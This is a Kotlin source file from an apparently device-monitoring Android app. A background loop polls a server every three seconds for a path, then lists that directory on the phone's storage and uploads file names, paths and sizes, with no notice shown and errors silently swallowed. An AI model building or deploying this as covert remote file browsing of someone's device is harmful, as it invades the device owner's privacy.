package com.example.sentry.service

import android.content.Context
import android.os.Environment
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object BackgroundFileManager {
    private var pollerJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var currentBrowsingPath = "/sdcard"

    fun startListening(context: Context) {
        if (pollerJob?.isActive == true) return
        pollerJob = scope.launch {
            val client = SentryApiClient(context)
            // Initial sync of root sdcard
            syncDirectory(context, client, "/sdcard")

            while (isActive) {
                try {
                    val res = client.pollFileCommand()
                    if (res.isSuccess) {
                        val reqPath = res.getOrNull()
                        if (!reqPath.isNullOrBlank()) {
                            currentBrowsingPath = reqPath
                            syncDirectory(context, client, reqPath)
                        }
                    }
                } catch (_: Exception) {
                }
                delay(3000)
            }
        }
    }

    private suspend fun syncDirectory(context: Context, client: SentryApiClient, dirPath: String) {
        withContext(Dispatchers.IO) {
            try {
                val targetDir = if (dirPath == "/sdcard" || dirPath.isEmpty()) {
                    Environment.getExternalStorageDirectory()
                } else {
                    File(dirPath)
                }

                val filesArray = JSONArray()
                if (targetDir.exists() && targetDir.isDirectory) {
                    val list = targetDir.listFiles()
                    if (list != null) {
                        val sorted = list.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                        for (file in sorted) {
                            if (file.name.startsWith(".")) continue // Skip hidden
                            val isDir = file.isDirectory
                            val sizeStr = if (isDir) {
                                "Folder"
                            } else {
                                formatFileSize(file.length())
                            }

                            val item = JSONObject().apply {
                                put("name", file.name)
                                put("path", file.absolutePath)
                                put("size", sizeStr)
                                put("isFolder", isDir)
                            }
                            filesArray.put(item)
                        }
                    }
                }

                client.syncFiles(targetDir.absolutePath, filesArray)
            } catch (_: Exception) {
            }
        }
    }

    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes >= 1024 * 1024 * 1024 -> String.format("%.1f GB", bytes / (1024.0 * 1024 * 1024))
            bytes >= 1024 * 1024 -> String.format("%.1f MB", bytes / (1024.0 * 1024))
            bytes >= 1024 -> String.format("%.1f KB", bytes / 1024.0)
            else -> "$bytes B"
        }
    }
}
